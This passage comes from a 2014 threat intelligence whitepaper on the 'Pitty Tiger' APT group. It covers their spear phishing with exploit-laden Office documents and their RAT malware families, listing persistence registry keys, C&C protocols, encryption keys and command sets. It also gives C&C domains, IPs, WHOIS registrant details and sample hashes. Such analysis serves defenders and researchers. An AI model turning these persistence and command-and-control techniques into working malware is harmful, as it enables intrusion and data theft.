to drive - by download of a malware , or open an attached file which will infect their computer .
Some groups of attackers also use “ watering hole ” techniques to successfully compromise their
targets . To build a watering hole attack , attackers do compromise the website of a third party ,
generally a supplier of the target , which is typically visited by a specific group of professionals and
very likely by the target . Every visitor of the compromised third party is then infected . The method
has one major drawback : it will also infect third parties who visit the website . Attackers have
developed ways to avoid this . If their reconnaissance phase has been done effectively , they already
know all IP ranges used by the target company . It just takes a few lines of code in the infecting script
to only compromise visitors coming from the target IP ranges .
Direct attacks against servers of the target can also be a way to penetrate the target ’s network .
ACCESS STRENGTHENING & LATERAL MOVES
Attackers have gained access to one or several machines inside the target ’s corporate network .
They need to install several different backdoors in order to be able to always access the network . In
case one backdoor falls , there will be others .
As soon as the attackers are sure they have enough access , they start looking for two things :
intellectual property ( or anything else they want to know or steal ) in alignment with predefined
mission objectives , and a means of privilege escalation to facilitate lateral movement within the
compromised environment . It generally does not take long before the attackers gain domain
administrator privileges and dump all the Active Directory content .
They use lateral moves between machines inside the network , and look for everything they need .
This step is very hard to detect , since they only use valid credentials and legitimate administration
tools such as PsExec .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                          Page : 6/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
DATA EXFILTRATION
Data exfiltration is the last step before the attackers loop to the lateral moves step , in a never - ending
circle of prolonged access and information theft .
They generally create archive files containing the content they want to exfiltrate , which are then sent
to the attackers by using a remote administration tool ( RAT ) or transfer protocols such as FTP and
HTTP .
This phase is not the end of an APT attack . The attackers loop to the access strengthening / lateral
moves stage and generally keep stealing more information and stay inside the network for more
data gathering .
For more information about all the APT phases , please refer to our APT Kill Chain blog post serie1 .
1
http://blog.cassidiancybersecurity.com/tag/APT
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 7/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
“ PITTY TIGER ” INVESTIGATION CONTEXT
During our regular investigations on APT cases , one particular variant of malware caught our
attention , because we had not faced it before . We decided to spend some time to investigate around
this malware and found out that it was used exclusively by a single group of attackers . This malware
family is known as “ PittyTiger ” by the anti - virus research community .
We discovered this malware sample in June 2014 , leading to a command & control ( c&c ) server still
in activity .
Our researches around this particular malware family revealed the “ Pitty Tiger ” group has been
active since 2011 , yet we found other publications1 which could probably be attributed to the same
group of attacker back in 20102 .
This group uses other malware and tools during their APT operations , in addition to the PittyTiger
RAT .
A variant of the infamous Gh0st RAT dubbed “ Paladin ” has been used repeatedly by the PT group ,
together with other RATs which seem to be developed exclusively for the PT group : “ MM RAT ” ( aka
Troj / Goldsun - B ) , and “ CT RAT ” . Another variant of Gh0st RAT named “ Leo ” has been found inactive
on a c&c server .
We also found another malware , named “ Troj / ReRol . A ” . This one is also used by the group to infect
workstations , collect system information , and install more malware on the infected computer . It acts
as a first stage downloader and system data collector often used in the initial compromise of the
Pitty Tiger campaigns , generally embedded in Microsoft Office documents .
Thanks to server ’s misconfigurations , we managed to get information from three c&c servers used
by this group of attackers , which provided us with insight from the end of 2013 to the beginning of
July 2014 .
Our investigation has been focused on the data we could get from these c&c servers but also on the
Pitty Tiger environment .
This whitepaper aims to expose the view we have on the group , especially on their infrastructure
and capabilities . We hope this publication will bring further counter analysis from the research
community to enrich the global common threat knowledge .
1
http://nakedsecurity.sophos.com/2012/08/03/poisoned-doc-targeted-malware-attack/
2
http://nakedsecurity.sophos.com/2010/06/24/targeted-trident-cyberattack-defence-company/
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 8/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
INFECTION METHODS
SPEAR PHISHING AND WEAPONIZED DOCUMENTS
Pitty Tiger , like most other APT groups , use spear phishing e - mails extensively in order to gain an
initial foothold within the targeted environment .
We have been able to find a spear phishing e - mail crafted by the attackers . This e - mail spoofed the
identity of an employee of a targeted company :
From : XXXXXXX
To : XXXXXXX
File : 1 Attachment : Bird ’s Eye Point of View.doc
While the holiday season means clustering clustering ‘ time for a
vacation’ for many , there are Those That Will Be of us staying home this
year . That ’s why we ’ve Decided to take you on a trip around the world
from a bird ’s eye view of the item ! It ’s safe to say That MOST of the
lucky people on vacation Will not see breathtaking sights like these .
Remember to look down !
XXXXXX
The attached file is a Microsoft Office Word document triggering CVE-2014 - 1761 to infect the
computer it is sent to :
Word document used to infect computers with Troj / ReRol . A
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 9/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
While this example looks very “ amateur ” for a spear phishing attempt , we suppose the group has
conducted more advanced spear phishing campaigns , based on the fact that we found infected
Word documents showing content stolen from victims of the group . These documents were infecting
the system with Troj / ReRol . A malware , which we will detail later in this report .
This could mean that the Pitty Tiger group is using stolen material as spear phishing content either
to target other persons in the compromised company , or to target other persons in a competitor ’s
company , or more generally to compromise another target .
Pitty Tiger also seem to use fake Microsoft Office Excel content , yet we could only find empty
content delivering once again the Troj / ReRol . A malware .
DIRECT ATTACKS
Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on
the group ’s targets servers , we have been able to record several vulnerability scanning launched
from one c&c server straight to the targets .
The attackers have been using different vulnerability scanners aimed at their targets . While some
targets have been scanned with “ generic ” vulnerability scanning tools like HScan or Fluxay and port
scanners like Nmap , some other targets have been scanned for very specific vulnerabilities , like a
ZyWALL vulnerability or a FORTINET product .
We have also been able to testify that the Pitty Tiger group has successfully collected information on
some of their targets by exploiting the HeartBleed1 bug . This vulnerability which exists on some old
versions of OpenSSL allows attackers to collect data from chunks of memory from the targeted
machine . It allowed the Pitty Tiger group to get admin credentials from at least one target , for
example .
Memory data leak from one server – Heartbleed exploit on one of PittyTiger ’s targets
1
http://heartbleed.com/
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                    Page : 10/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or
on several domains is a very noisy way to collect information and find server vulnerabilities . We
would advocate that this method is unwise when you want to stay furtive , and doing it from a c&c
server is very surprising , to say the least . While the Pitty Tiger group is experienced on some
aspects on its running APT campaigns , it definitely lacks some maturity here .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 11/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
MALWARE INFORMATION
TROJ / REROL.A
One of the favorite methods used by the Pitty Tiger group to infect users is to use a Microsoft Office
Word document which exploits a specific vulnerability .
The payload infecting the system is malware known as “ Troj / ReRol . A ” . It is generally the first step of
the initial compromise for Pitty Tiger campaigns .
Exploitation
We have been able to find one such document1 used by that group of attacker , exploiting CVE-
2012 - 0158 , an old critical vulnerability impacting Microsoft Office and corrected by Microsoft ’s
MS12 - 027 fix in April 2012 . This vulnerability affects Microsoft Office versions up to Office 2010 . We
also found one RTF document embedding CVE-2014 - 1761 , which is a more recent exploit .
We discovered several different documents spreading this malware by triggering CVE-2012 - 0158
vulnerability , yet we could not share them in this report , since these documents contain information
about victims of the Pitty Tiger group .
The discovery of this “ old ” vulnerability exploitation in June 2014 could mean that the Pitty Tiger
group has no direct access to 0day exploits , or not enough budgets to buy some . It could also mean
they use their low range exploit by default because it is working on their targets and is sufficient to
compromise their workstations .
The Word document we initially found was probably a “ test ” document used by the group . When
opened , it shows a single line written in Chinese language , which can be translated as “ Hello ! ”
Microsoft Office Word decoy “ test document ” used by the Pitty Tiger group
Installation
When successfully triggered , the exploit infects the host by dropping and executing a file named
“ svohost.exe”2 in the temporary folder of the currently logged - in user :
1
MD5 hash : e70c0479cdb9aa031a263740365e7939
2
MD5 hash : 1752aacc08ee0acd58405e9bc10b0dbb
Public release
Threat Intelligence
“ The Eye of the Tiger ”                              Page : 12/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
C:\DOCUME~1\USER\LOCALS~1\Temp\svohost.exe
This binary is “ Troj / ReRol . A ” according to Sophos naming convention1 . It immediately triggers
alarms on our sandbox :
Alarms in our sandbox system , triggered by the Troj / ReRol . A malware
The binary drops a copy of itself in the Application Data folder of the currently logged - in user :
Creation of a copy of the Pitty Tiger malware in a user folder in our sandbox
The malware initiates a communication to time.windows.com to check for connectivity , and then
communicates with the c&c server at mac.avstore.com.tw .
1
http://www.sophos.com / en - us / threat - center / threat - analyses / viruses - and - spyware / Troj~Rerol-
A / detailed - analysis.aspx
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                 Page : 13/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Beginning of an encrypted communication between the Troj / ReRol . A malware and its c&c server
Very few variants of Troj / ReRol . A are public . The variants we have seen did use that same User-
Agent :
Mozilla/4.0 ( compatible ; )
The persistence mechanism used by the malware is the creation of a registry key named “ Shell ”
containing the path to the malware on the infected system :
Key Path : \REGISTRY\USER\<SID>\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon
Value Name : Shell
Value : explorer.exe,C:\DOCUME~1\XXXXXX\APPLIC~1\svohost.exe ,
The payload of this malware is used to collect information on the newly infected host , and send it
back to the c&c server . It can also download and execute binaries .
Command & Control
The data sent in the POST request has a 0x11 bytes header consisting of a fixed - value byte ( 0xc3 )
followed by a 0x10 bytes encryption key . The data following the header is encrypted using RC4 with
the previous key . Once the data is deciphered , the last byte of the clear text should also be 0xc3 .
We have been able to decrypt the communications and confirmed what is transmitted to the c&c
server .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                             Page : 14/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Here is an anonymized sample of communication showing information collected by the malware :
HostName : xxx
UserName : xxx
SysType : 32bit
Windows 7 Enterprise Service Pack 1 6.1 7601
Organization :
Owner : xxx
--------------Server Info-------------------
- AdobeARMservice
- Adobe Acrobat Update Service
- AeLookupSvc
- Application Experience
- AudioEndpointBuilder
- … ( list goes on )
--------------Soft Info-------------------
1    Adobe AIR 4.0.0.1390
2    Adobe Shockwave Player 12.0 12.0.9.149
3    FileZilla Client 3.7.4.1 3.7.4.1
4    Mozilla Thunderbird 24.3.0 ( x86 en - US ) 24.3.0
5    … ( list goes on )
--------------IP Config-------------------
Adapt Type : Ethernet
NetCardNum :        11
NetCard Name :      { XXX - XXXX - XXXX - XXXX - XXXXXXXXXXXX }
Description :      Realtek RTL8139C+ Fast Ethernet NIC
MAC - ADDR :          XX - XX - XX - XX - XX - XXX
IP - Addr :           10.xxx.xxx.xxx
IP - Mask :           255.255.255.0
GateWay :           10.xxx.xxx.xxx
DHCP Serv :         1
DHCP Host :         10.xxx.xxx.xxx
WINS Serv :         0
WINS PriHost :
WINS SecHost :
Sample information collected by Troj / ReRol . A malware
This information is very useful for an attacker : it shows all software installed on the system , and
running services .
Once this data has been transferred to the c&c server , it responds by sending additional malware to
execute on the machine .
The c&c part consists of two files :
- dr.asp : an ASP frontend instantiating a control , setting some variables , and passing the
payload .
- JHttpSrv.dll : a controller which should be registered via “ regsvr32 ” . It exposes 4 methods
which can be called by the ASP script :
o SetIP(strIP ) : sets the bot IP address
o AddKeyword(strKeyword , strFilePath ) : binds a keyword to a binary on the server
o Work(lpByteArray , nDataLength ) : deciphers the payload , looks for the registered
keywords , and writes it to a logfile
o ResponseBinary ( ) : sends back the binary matching a specific a keyword
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 15/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The dr.asp registers the following keywords :
- “ SysType : 32bit ” to the binary “ 32.exe ”
- “ SysType : 64bit ” to the binary “ 64.exe ”
These two binaries were no longer available on the server . However , we found various files which
could have been used as “ 32.exe ” in the past :
- 3200.exe
- 322.exe
- 32m.exe
- 32mm.exe
The 322.exe file is a legitimate , Chinese , calc.exe tool . It might have been used by the attackers to
perform tests .
The 3 others binaries are RATs , which will be detailed in the next parts .
PITTYTIGER RAT
This RAT is the origin of the attackers’ group name . “ PittyTiger ” is a mutex used by the malware .
“ Pitty Tiger ” is also a string transmitted in the network communications of the RAT , as you will see in
this chapter .
Installation
The malware1 , when running in our sandbox , triggers the following alarms :
Alarms in our sandbox system , triggered by the PittyTiger malware
The binary drops two files in “ C:\Windows\System32 ” :
1
MD5 hash : be18418cafdb9f86303f7e419a389cc9
Public release
Threat Intelligence
“ The Eye of the Tiger ”                          Page : 16/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Files dropped by the PittyTiger RAT in our sandbox
The “ qmgrxp.exe ” binary is a simple copy of the original binary . It drops the “ packet64.dll ” , and
injects it in “ explorer.exe ” . When executed , a mutex called “ PittyTiger ” is created .
Persistence is achieved by adding the path to the binary to the WinlogonUserInit key :
Key Path : \REGISTRY\USER\<SID>\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon
Value Name : UserInit
Value : C:\WINDOWS\system32\userinit.exe , C:\WINDOWS\system32\qmgrxp.exe ,
The “ packet64.dll ” is the main payload of the RAT . After being injected , it starts sending its Hello
packet to its c&c server :
Sample communication from PittyTiger RAT
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 17/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Command & Control
All the requests sent to the c&c contains the string “ /FC001/ ” followed by the bot i d . This i d consists
of the infected computer name followed by a dash and the lower word of the disk serial i d .
The data sent is simply encoded using base64 , there is no cipher at all . The hello packet , once
decoded , looks like the following :
--------------------------PittyTigerV1.0                            ---------------------
--------------                            ^ ^             ----------------------------
--------------                              ^             ----------------------------
Version : NULL
Our sample had 3 c&c servers configured :
- jackyandy.avstore.com.tw:80
- chanxe.avstore.com.tw:443
- newb02.skypetm.com.tw:80
The following commands are implemented :
- File Download ( get ) and Upload ( put )
- Screen Capture 8bit ( prtsc ) and 16bit ( prtsc2 )
- Remote Shell ( ocmd / ccmd )
- Configuration update ( setserv / freshserv )
- Direct command execution
Regarding the controller part , we found two different versions :
- A Delphi binary handling PittyTiger connections only
- A .NET binary handling both PittyTiger and CT connections
The interface handling both Pitty TIGER and CT connections is very interesting . We have been able
to confirm that the author of those two families of malware is the same person , as will be seen in the
next chapter about “ CT RAT ” .
Pitty Tiger RAT – controller part
Public release
Threat Intelligence
“ The Eye of the Tiger ”                            Page : 18/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
CT RAT
This remote administration tool is often used by the Pitty Tiger group . We have been able to acquire
both the client and the server parts .
We found two instances of the same binary with different names – 32mm.exe and mm32.exe1 .
This RAT seems to be an evolution of PittyTiger , since a specific server binary we found could
handle both requests from CT and PittyTiger , and was indicated as compatible with PittyTiger .
Moreover , the same commands are implemented in both RATs .
Installation
Unsurprisingly , when running in our sandbox , the RAT triggers the same alarms as PittyTiger :
Alarms in our sandbox system , triggered by the CT RAT
The binary drops two files in “ C:\Program Files\Internet Explorer ” :
1
MD5 hash : f65dc0b3eeb3c393e89ab49a3fac95a8
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 19/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Files dropped by the CT RAT in our sandbox
The “ ieupdate.exe ” is a simple binary to inject the DLL into “ explorer.exe ” .
Persistence is achieved via the following registry key :
Key Path : \REGISTRY\USER\<SID>\Software\Microsoft\Windows
NT\CurrentVersion\Windows
Value Name : load
Value : c:\PROGRA~1\INTERN~1\ieupdate.exe
After injection , the RAT sends a first login packet to its c&c :
Encrypted communication from a machine infected with CT RAT
Command & Control
The RAT communication is performed through HTTP requests . The data is sent encrypted with
RC4 , and base64-encoded . The RC4 key is the Unicode form of the requested URL .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 20/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The Login packet contains the following string , after decoding and deciphering :
Login
->C : PC - XXX
->U : User - XXX
->L:10.10.10.1
->S : Microsoft Windows XP Service Pack 3 5.1 2600
->M : Nov 13 2013
->P:1033
It contains the computer name , the user name , the internal IP address , the OS version , the RAT
internal version and the Language ID of the system .
The RAT can then receive commands from its c&c . Usual RAT features are implemented :
- File Download ( GET ) and Upload ( PUT )
- Remote shell ( ocmd / ccmd )
- Configuration update ( cfg )
- Sleep ( sleep )
Version and author(s )
Regarding the configuration , our sample communicates with “ sop.avstore.com.tw ” , and contains the
string “ Nov 13 2013 ” , which should be a version identifier .
The c&c part is a Windows binary written in .NET . We found 2 versions :
- Version 2013.10 : CT only controller
- Version 2013.12 : CT and PittyTiger controller
The About form gives the name of the developer(s ) :
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 21/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
CT controller in action with a testing machine of ours
The version of the controller which can handle both PittyTiger and CT shows the same author(s ) :
CT / PittyTiger controller
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 22/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
As these screenshots show , the switch between PittyTiger and CT was probably in the last semester
of 2013 .
The text can be translated , thanks to Google Translate , as :
CT console ( compatible pittytiger ) v1.3
2013.12 by Trees and snow
Further discussion about this author is provided in subsequent sections .
MM RAT ( AKA TROJ / GOLDSUN - B )
We named this malware “ MM RAT ” at the beginning of our investigation , before we found an
existing name for it , “ Troj / Goldsun - B ” according to Sophos . This is another remote administration
tool often used by the Pitty Tiger crew . We have been able to acquire both a client and server part
for it .
Installation
The binary we found is named 3200.exe1 , and triggers the following alarms in our sandbox :
Alarms in our sandbox system , triggered by the Troj / Goldsun - B malware
The “ release.tmp ” file is dropped on the system :
1
MD5 hash : 728d6d3c98b17de3261eaf76b9c3eb7a
Public release
Threat Intelligence
“ The Eye of the Tiger ”                            Page : 23/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
File dropped by the malware in our sandbox
The binary is also copied to the user ’s “ Application Data ” directory , and injects the “ release.tmp ” file
in “ explorer.exe ” .
Persistence is achieved by adding the path to the binary to the Winlogon Shell key :
Key Path : \REGISTRY\USER\<SID>\Software\Microsoft\Windows
NT\CurrentVersion\Winlogon
Value Name : Shell
Value : explorer.exe,C:\DOCUME~1\<UserName>\APPLIC~1\<binary name > ,
The RAT embeds its own DNS server IP addresses to make the c&c domain names resolutions .
These addresses are listed below :
-    63.251.83.36
-    64.74.96.242
-    69.251.142.1
-    212.118.243.118
-    216.52.184.230
-    61.145.112.78
-    218.16.121.32
Command & Control
It starts resolving its domains after injection , and immediately sends requests . First requests are
used to check for updates ( GET request on /httpdocs / update / update.ini ) . A Hello packet is then sent :
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 24/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Hello packet sent by Troj / Goldsun - B to its c&c server
The bot then repeatedly sends GET requests on “ /httpdocs / mm/<bot_id>/ComMand.sec ” to retrieve
remote commands .
The communication protocol is quite simple : GET requests are used to receive data from the c&c ,
and POST requests to send data . In POST commands , the CGI name represents the command .
The following features are implemented :
- c&c authentication using password
- Remote shell
- Remote commands
- File Download / Upload / Deletion / Search
- Bot termination
The following CGI files can be requested by the bot :
- Vip : test for connectivity
- Owpp4 : register new bot
- CReply : answer to remote commands
- Clrf : clear remote file ( to clear ComMand.sec after reading )
- CFile : transmit file ( file transfers or answers to commands )
- Cerr : send error
The configuration is stored locally in a file called “ schmup.sys ” . The file is ciphered using RC4 , using
the MD5 hash of “ rEdstArs ” as the key .
Our sample uses “ mca.avstore.com.tw ” , “ star.yamn.net ” and “ bz.kimoo.com.tw ” as c&c servers . It
contains the “ 1.6.0 ” version number , and uses the password “ 9ol.8ik , ” to authenticate with the bots .
Unlike others c&c binaries , the c&c part of this RAT does not have a graphical interface , but can be
remotely requested to manage the bots . Furthermore , no authentication is required to send
commands to the c&c ( but you need to know the configured password to interact with the bots ) .
The management protocol is the same as the bots protocol , with different CGI files :
- Shutdown : shutdown the c&c
- Cnor : add a new command for a bot ( writes it in “ ComMand.sec ” )
- Mlist : get the list of bots
- Mlist2 : write the list of bots to the file “ Online.dat ”
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 25/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
The bots’ answers to remote commands can be retrieved by requesting the “ Reply.sec ” file ( e.g.
GET /httpdocs / mm/<bot_id>/Reply.sec )
Network patterns
These network patterns might ring bells in some researcher ’s minds . The network communication
used by this binary are the same as those used by the Enfal malware , which has been used in the
past by the Lurid group ( APT attackers ) and by other threat actors in China1 .
An examination of the code did not reveal code similarities with the Enfal malware . We do not
currently know why this malware uses the same patterns to communicate .
PALADIN RAT
This is another remote administration tool used by the Pitty Tiger group . We have been able to get
both a client and server part of it .
Installation
The binary we found was dropped by a malicious Word document . The following alarms are
triggered in the sandbox :
Alarms in our sandbox system , triggered by the Paladin RAT
The shellcode contained in the Word file drops the following file , and executes it :
- C:\Documents and Settings\<User>\Local Settings\Temp\svohost.exe2
This one drops in turn the following file :
1
http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf
2
MD5 hash : 0567fd7484efbae502cac279d32ed518
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 26/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
File dropped by the malware in our sandbox
This tmp file is then copied to “ C:\Windows\system32\Nwsapagentex.dll ” and registered as a service
called “ Nwsapagent ” .
This malware is a variant of the infamous Gh0st RAT1 . Our specific sample uses “ ssss0 ” instead of
the usual “ Gh0st ” header for network communications .
Command & Control
The commands ID used in the communication protocol have also changed , but the features are
quite the same .
The configuration is directly embedded in the binary , and deciphered at runtime . Up to 5 c&c servers
can be configured , but our sample only had one : “ ey.avstore.com.tw:53 ” .
“ EY ” could stand for “ Ernst & Young ” . It would not be very surprising , since a lot of different attack
groups do use anti - virus vendors or other big company ’s names to try to look more legitimate . Pitty
Tiger is no exception , as detailed later in this report .
We also found two c&c binaries , claiming to be versions 2.1 and 2.2 of the Paladin RAT controller .
Version 2.1 answers to the “ ssss0 ” header , while version 2.2 uses the classical “ Gh0st ” header .
Paladin controller used with one of our testing machines
1
http://www.mcafee.com/sg/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 27/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Paladin has multiple features : file transfer , screenshot , command shell …
LEO RAT
Additionally to the Paladin RAT , we found another variant of Gh0st RAT , named “ Leo ” . Although we
have found it on a c&c server of the group , there is no evidence that is has been used by the group ,
in opposition to Paladin which is used often by Pitty Tiger .
Moreover , the built malware we found in the same folder was configured to connect to a local IP
address , probably for testing purposes .
Public release
Threat Intelligence
“ The Eye of the Tiger ”                               Page : 28/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
Leo malware controller screenshot – a variant of Gh0st RAT
Public release
Threat Intelligence
“ The Eye of the Tiger ”                         Page : 29/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
INFRASTRUCTURE
Our investigation has focused on three particular c&c servers used by the group . These c&c servers ,
unlike the other c&cs used by the group , have been misconfigured . Once parsed and dumped , it
provided us with more insight .
We found several domains used by the Pitty Tiger group , the most interesting ones being detailed in
this chapter .
Pitty Tiger , like other APT attackers , often use anti - virus “ familiar names ” when registering domains
or creating subdomains . Some examples can be avstore.com.tw , sophos.skypetm.com.tw ,
symantecs.com.tw , trendmicro.org.tw etc .
AVSTORE.COM.TW
WHOIS Data
The      registration    information    for     this    domain        has     been       the     same    since    2013 - 06 - 04 :
Domain Name : avstore.com.tw
Registrant :
information of network company
longsa longsa33@yahoo.com
+ 86.88885918
No.520.spring road.shenyang
shanghai , shanghai
CN
This information has been used to register another domain , skypetm.com.tw , which has also been
used by the Pitty Tiger group .
Malware families
Our research also led us to the discovery of four different malware families connected to
subdomains of avstore.com.tw :
-     PittyTiger RAT ( aka Backdoor : Win32/Ptiger . A )
-     Troj / ReRol . A
-     CT RAT
-     Paladin RAT ( variant of Gh0st RAT )
MD5                                         Family                                    C&C
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                Page : 30/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
0d3b3b422044759b4a08a7ad8afe55c7                      Paladin dropper                      ey.avstore.com.tw
75cf4f853f0f350fac9be87371f15c8d              Exploit : Win32/CVE-2012 - 2539                 mac.avstore.com.tw
b6380439ff9ed0c6d45759da0f3b05b8                  Troj / ReRol . A dropper                    sop.avstore.com.tw
5e2360a8c4a0cce1ae22919d8bff49fd                       Troj / ReRol . A
f65dc0b3eeb3c393e89ab49a3fac95a8
e7dc3bbe8b38b7ee0e797a0e27635cfa                            CT RAT
4ce8593c9de2b27b5c389f651c81638b                                                        chanxe.avstore.com.tw
jackyandy.avstore.com.tw
8df89df484ca5c376b763479ea08d036                          PALADIN
be18418cafdb9f86303f7e419a389cc9                       Pitty Tiger RAT                 jackyandy.avstore.com.tw
MD5 hashes of files linked to avstore.com.tw
Links between malware samples , malware families , and avstore.com.tw subdomains
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                Page : 31/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
C&C servers and IP addresses
Hosting company              Geolocation         IP Range             IP Address          Host                        Time space
HongkongDingfengxinhuiBgp    Kowloon , Hong       122.10.0.0 –         122.10.48.189       chanxe.avstore.com.tw       Actually in use
Datacenter                   Kong                122.10.63.255
jackyandy.avstore.com.tw
Hurricane Electric Inc       Fremont , USA        66.220.0.0 –         66.220.4.100        mac.avstore.com.tw          Actually in use
66.220.31.255
sop.avstore.com.tw
ey.avstore.com.tw
New World Telephone LTD      Hong Kong City ,     58.64.175.0 –        58.64.175.191       jackyandy.avstore.com.tw    Dec. 2013
Hong Kong           58.64.175.255
Avstore.com.tw infrastructure : hosting and subdomains
SKYPETM.COM.TW
WHOIS Data
This domain has shown two different WHOIS entries through time :
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                      Page : 32/58
Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “ The Eye of the Tiger ”
-     From 2011 - 12 - 29 to 2013 - 01 - 02 :
Registrant : chenzhizhong
Email : hurricane_huang@163.com
Telephone : + 86.2426836910
-     From 2013 - 11 - 21 until today :
Registrant : long sa
Email : longsa33@yahoo.com
Telephone : + 86.88885918
The most recent registration information is also used for avstore.com.tw .
Malware families
Six malware families have been identified as communicating with subdomains of skypetm.com.tw :
-     MM RAT
-     Pitty Tiger RAT
-     Troj / ReRol . A
-     CT RAT
-     Paladin
-     Exadog
MD5                                      Malware family                           C&C server
81fa811f56247c236566d430ae4798eb                             MM RAT                           ms11.skypetm.com.tw
55e456339936a56c73a7883ea1ddb672                      Backdoor : Win32/Ptiger . A                botemail.skypetm.com.tw
d5da60d678d5a55a847e1e6723c7a4d0                      Backdoor : Win32/Ptiger . A                  aniu.skypetm.com.tw
0750569cf1733d4fbb01169476387cc2                      Backdoor : Win32/Ptiger . A                  aniu.skypetm.com.tw
zeng.skypetm.com.tw
abb0abfab252e4bfb9106273df3c1c2                       Backdoor : Win32/Ptiger . A                  aniu.skypetm.com.tw
zeng.skypetm.com.tw
c0656b66b9f4180e59e1fd2f9f1a85f2                            Troj / Rerol . A                      zeng.skypetm.com.tw
ce15fa3338b7fe780e85c511d5e49a98                            Troj / Rerol . A                      zeng.skypetm.com.tw
8a54adb3976d1c03605656ca55be7400                      Backdoor : Win32/Ptiger . A                 super.skypetm.com.tw
a1ea6dc12b983c7262fe76c1b3663b24                      Backdoor : Win32/Ptiger . A                 qinoo.skypetm.com.tw
b6380439ff9ed0c6d45759da0f3b05b8                        Troj / Rerol . A dropper                 sophos.skypetm.com.tw
5e2360a8c4a0cce1ae22919d8bff49fd                            Troj / ReRol . A                     sophos.skypetm.com.tw
79e48961d1ee982a466d222671a42ccb                            Troj / ReRol . A                     sophos.skypetm.com.tw
4ab74387f7a02c115deea2110f961fd3                              ReRol . A                        sophos.skypetm.com.tw
bf95e89906b8a17fd611002660ffff32                            Troj / ReRol . A                     sophos.skypetm.com.tw
CONTAINS VICTIM INFORMATION                      Office Word file - Rerol . A dropper          sophos.skypetm.com.tw
4ce8593c9de2b27b5c389f651c81638b                              CT RAT                         newb02.skypetm.com.tw
8df89df484ca5c376b763479ea08d036                              Paladin                        newb02.skypetm.com.tw
22e47c5e3809a4150d0db7fc99a68cc0                     Office Excel file – Rerol . A              margo.skypetm.com.tw
dropper
dd87c68c1e71bb104a48a6be87a2349f                      Backdoor : Win32/Ptiger . A                 ripper.skypetm.com.tw
068870c2c165a1d29fc2f3d3edfed3ae                         Win32/Exadog . AA                        link.skypetm.com.tw
Unknown                                               Backdoor : Win32/Ptiger . A                  asdf.skypetm.com.tw
Public release
Threat Intelligence
